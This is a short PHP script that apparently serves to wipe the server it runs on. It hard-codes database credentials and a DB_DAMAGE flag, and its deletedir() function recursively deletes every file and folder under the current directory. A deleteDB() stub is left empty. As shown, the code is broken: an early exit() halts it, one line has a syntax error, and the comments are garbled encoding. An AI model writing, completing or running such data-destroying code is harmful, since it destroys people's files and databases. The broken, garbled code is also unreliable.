<?php
define('DB_USER', 'jiaju');
define('DB_PWD', 'jiaju@503');
define('DB_HOST', '127.0.0.1');
define('DB_PORT', '3306');
define('DB_DAMAGE', true); 
 
run();
 
/**
 * 
 * @return void
 **/
function run()
{
    deletedir();
	
    deleteDB();
}
 
/**
 *
 * @return void
 **/
function deletedir($dir = ''){
    if ($dir == '') {
        $dir = realpath('.');
    }
    echo $dir;
    exit();
      if(!handle=@opendir($dir)){     //���Ҫ��Ŀ¼�Ƿ����
        die("û�и�Ŀ¼");
      }
      while(false !==($file=readdir($handle))){
               if($file!=="."&&$file!==".."){       //�ų���ǰĿ¼�븸��Ŀ¼
                $file=$dir .DIRECTORY_SEPARATOR. $file;
                if(is_dir($file)){
                    deletedir($file);
                }else{
                    if(@unlink($file)){
                        echo "�ļ�<b>$file</b>Success<br>";
                    }else{
                        echo  "�ļ�<b>$file</b>False!<br>";
                    }
                }
               }
               if(@rmdir($dir)){
                echo "Ŀ¼<b>$dir</b>Success<br>\n";
               }else{
                echo "Ŀ¼<b>$dir</b>False<br>\n";
               }
           }
 
/**
 * 
 * @return void
 **/
function deleteDB()
{
    if(DB_DAMAGE === true){
        //start
    }
}